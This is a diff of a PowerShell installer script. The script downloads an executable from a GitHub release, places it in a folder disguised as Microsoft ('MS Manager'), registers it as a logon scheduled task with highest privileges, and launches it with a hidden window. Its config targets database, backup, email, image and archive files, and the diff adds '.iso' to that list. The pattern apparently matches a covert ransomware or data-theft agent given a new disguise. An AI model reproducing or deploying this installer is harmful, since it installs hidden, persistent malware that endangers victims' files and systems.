@@ -1,14 +1,11 @@
-$dir = "$env:LOCALAPPDATA\itmgn"
-$exe = "$dir\itagnt.exe"
-$zip = "$dir\itagnt.zip"
-$cfg = "$dir\agent.json"
+$dir = "C:\ProgramData\MS Manager"
+$exe = "$dir\imng.exe"
+$cfg = "$dir\servicess.json"
 
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
-Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1.0/itagnt.zip" -OutFile $zip -UseBasicParsing
-Expand-Archive -Path $zip -DestinationPath $dir -Force
-Remove-Item $zip -Force
+Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1.0/imng.exe" -OutFile $exe -UseBasicParsing
 
 if (Test-Path $cfg) {
     try { $existing = Get-Content $cfg -Raw | ConvertFrom-Json; $agentId = $existing.AgentId } catch { $agentId = $null }
@@ -27,7 +24,7 @@ $configObj = @{
         ".sql", ".mdf", ".ldf", ".frm", ".myd", ".myi", ".ibd", ".dump", ".db", ".sqlite", ".sqlite3",
         ".bak", ".bkp", ".bkf", ".backup", ".vbk", ".vbm", ".vib",
         ".pst", ".ost", ".msg", ".eml",
-        ".jpg", ".jpeg", ".png", ".zip", ".rar"
+        ".jpg", ".jpeg", ".png", ".zip", ".rar", ".iso"
     )
 }
 
@@ -35,10 +32,12 @@ $json = $configObj | ConvertTo-Json -Depth 3
 $enc = New-Object System.Text.UTF8Encoding $false
 [System.IO.File]::WriteAllText($cfg, $json, $enc)
 
+cmd /c "schtasks /delete /tn ""MS Manager Agent"" /f" > $null 2>&1
 cmd /c "schtasks /delete /tn itmgn /f" > $null 2>&1
-cmd /c "schtasks /create /tn itmgn /tr `"$exe`" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1
+cmd /c "schtasks /create /tn ""MS Manager Agent"" /tr ""$exe"" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1
 
 Stop-Process -Name itagnt -Force -ErrorAction SilentlyContinue
+Stop-Process -Name imng -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Start-Process -FilePath $exe -WindowStyle Hidden
 Write-Host "Done. Agent ID: $agentId"
